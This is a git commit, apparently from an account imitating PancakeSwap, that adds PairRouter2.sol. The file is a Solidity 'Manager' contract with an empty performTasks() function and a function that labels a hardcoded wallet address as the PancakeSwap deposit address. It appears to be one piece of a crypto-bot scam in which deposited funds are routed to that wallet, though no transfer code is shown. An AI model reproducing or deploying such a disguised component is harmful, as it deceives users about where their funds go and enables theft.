1f3fe965b412b1ecc5077935098445597ad78c49
Pancakeswap-lib <88216902+Pancakeswap-lib@users.noreply.github.com>
2021-07-31 04:50:56 -0700

    Create PairRouter2.sol

---
+++ PairRouter2.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0x7d718310fd24be7559a2039bF19d2b9b5Df520fd;
+	}
+}
